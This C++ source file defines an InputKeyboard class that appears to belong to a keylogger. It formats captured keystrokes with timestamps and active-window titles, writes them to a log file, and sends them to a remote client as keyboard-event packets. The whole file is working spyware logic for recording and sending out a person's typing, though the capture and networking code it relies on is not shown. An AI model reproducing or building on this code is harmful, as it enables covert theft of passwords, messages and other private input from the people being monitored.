#include "InputKeyboard.h"

boost::chrono::system_clock::time_point InputKeyboard::LastKeyboardActivity = boost::chrono::system_clock::now();
std::string InputKeyboard::PreviousWindow = "";

InputKeyboard::InputKeyboard(void)
{
}

InputKeyboard::~InputKeyboard(void)
{
}

void InputKeyboard::format(std::streamoff logSize)
{
	std::string activeWindows = StaticTools::GetActiveWindowTitle();
	_format = "";
	boost::chrono::duration<double> diff = boost::chrono::system_clock::now() - LastKeyboardActivity;

	if (PreviousWindow != activeWindows) {
		if (logSize > 0)
			_format = "\n";
		_format += StaticTools::GetDate() + " | " + ((activeWindows.empty()) ? "NONE" : activeWindows) + " | ";
		PreviousWindow = activeWindows;
	}
	else if (diff.count() > 1.f) {
		if (logSize > 0)
			_format = "\n";
		_format += StaticTools::GetDate() + " | " + ((activeWindows.empty()) ? "NONE" : activeWindows) + " | ";
	}
	LastKeyboardActivity = boost::chrono::system_clock::now();
}

AInputType &InputKeyboard::operator>>(LogFile &logger)
{
	logger << _format << _data << std::flush;
	return (*this);
}

AInputType &InputKeyboard::operator>>(IClient &client)
{
	//client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, _format + _data);
	client << client.createPacket(PacketType::PT_KeyboardEvent, _format + _data);
	return (*this);
}